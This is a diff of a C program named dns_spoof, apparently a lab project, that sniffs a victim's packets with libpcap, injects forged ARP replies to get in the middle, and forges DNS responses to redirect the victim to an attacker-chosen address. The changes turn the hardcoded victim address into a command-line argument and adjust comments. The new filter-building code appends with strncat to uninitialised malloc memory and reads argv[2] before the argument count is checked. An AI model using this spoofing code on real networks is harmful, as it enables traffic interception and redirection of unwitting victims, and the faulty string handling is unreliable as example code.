@@ -218,7 +218,7 @@ struct dns_response{
 
 /* Other Global variables */
 char* if_name;
-char* filter_string = "host 192.168.100.60"; // Victim as the host, this is the machine in my lab
+char* filter = "host ", *filter_string = NULL;             // use the victim's address for the filter
 char pcap_errbuf[PCAP_ERRBUF_SIZE];
 struct timeval tv, checktv;
 
@@ -226,8 +226,7 @@ struct timeval tv, checktv;
 u_char http_get_request_liangzk[]   = {0x2f,0x7e,0x6c,0x69,0x61,0x6e,0x67,0x7a,0x6b,0x2f};  //  /~liangzk/
 u_char http_get_request_changec[]   = {0x2f,0x7e,0x63,0x68,0x61,0x6e,0x67,0x65,0x63,0x2f};  //  /~changec/
 u_char http_get_request_chanmc[]    = {0x2f,0x7e,0x63,0x68,0x61,0x6e,0x6d,0x63,0x2f,0x2f};  //  /~chanmc/ -> filled as /~chanmc//
-                                                                                            //  with a '/' as a stray character which the browser won't mind at the end of the url
-//u_char http_get[]                   = {0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31};          //  HTTP/1.1
+//u_char http_get[]                   = {0x48,0x54,0x54,0x50,0x2f,0x31,0x2e,0x31};            //  HTTP/1.1
 u_char* targetIP;           // Target ip where the Victim should be redirected to, by using it in DNS reply
 char* dns_request_dname;
 //u_char dns_request_dname[17] =  {0x03,0x77,0x77,0x77,0x07,0x73,0x69,0x6e,0x67,0x74,0x65,0x6c,0x03,0x63,0x6f,0x6d,0x00}; 
@@ -408,7 +407,7 @@ void Main_Callback(u_char* arg, const struct pcap_pkthdr* pkthdr, const u_char* 
     }
     u_int16_t packet_type = Handle_Ethernet(arg, pkthdr, packet);
     if(packet_type == ETHERTYPE_ARP) {        
-        Handle_ARP(mystruct, pkthdr, packet);    //dont bother about the ARP packets in HTTP redirecting, just the timer to inject ARP is enough to my knowledge
+        Handle_ARP(mystruct, pkthdr, packet);    //dont bother about the ARP packets in HTTP redirecting
     }
     else if(packet_type == ETHERTYPE_IP) {                
         Handle_IP(mystruct, pkthdr, packet);   
@@ -436,7 +435,8 @@ int Handle_ARP(struct myStruct* mystruct, const struct pcap_pkthdr* pkthdr, cons
     const struct arp_header* arp_hdr = (struct arp_header *)(packet + sizeof(eth_hdr));
     
     u_int16_t packet_type = arp_hdr->opcode;   
-    if (memcmp(arp_hdr->sender_mac, mystruct->victimMAC, ETH_ALEN) == 0) {
+    if (memcmp(arp_hdr->sender_mac, mystruct->victimMAC, ETH_ALEN) == 0)
+    {
         printf("\n[ARP] Request Packet From Victim");
         return ARP_Inject(*mystruct, false, mystruct->myMAC, &(mystruct->gatewayIP), mystruct->victimMAC, &(mystruct->victimIP));
     }
@@ -584,7 +584,7 @@ void Handle_DNS(struct myStruct *mystruct, u_char *packet, size_t size) {
     printf("Offset calculated before adding DNS response: %d\n", offset);
     printf("Size of DNS response header to be copied: %d\n", sizeof(struct dns_response));
     // MEMCPY(buf + size, dns_r, sizeof(struct dns_response));         // copy the DNS response header at the tail of the packet :-)
-    // I don't know why null bytes were inserted through the above step. Have resorted to the stupid steps below
+    // I don't know why null bytes were inserted by the above statement. Have resorted to some stupid lengthy steps as follows
     MEMCPY(buf+size, (const void*)&(dns_r->offset), sizeof(dns_r->offset));
     size += sizeof(dns_r->offset);
     MEMCPY(buf+size, (const void*)&(dns_r->type), sizeof(dns_r->type));
@@ -715,6 +715,10 @@ int ARP_Inject(struct myStruct mystruct, bool packet_type,
 
 int main(int argc, char* argv[]) {
     //struct timeval tv;
+    filter_string = (char *)malloc(strlen(filter)+strlen(argv[2])+1);       
+    strncat(filter_string, filter, strlen(filter));
+    strncat(filter_string, argv[2], strlen(argv[2]));
+
     struct bpf_program fp;              // holds the compiled program     
     bpf_u_int32 maskp, netp;            // subnet mask                                
     int count = 0, i;
@@ -722,7 +726,7 @@ int main(int argc, char* argv[]) {
 
     // Get the interface name, target IP address, target_page(liangzk or chanmc) from command line.
     if (argc != 5) {
-        fprintf(stderr, "usage: <./path/to/dns_spoof/dns_spoof> <interface> <victim's-ip-address> <target-ip> <domain-name-to-forge>\n");
+        fprintf(stderr, "usage: <~/path/to/dns_spoof/dns_spoof> <interface> <victim's-ip-address> <target-ip> <domain-name-to-forge>\n");
         exit(1);
     }                    
     
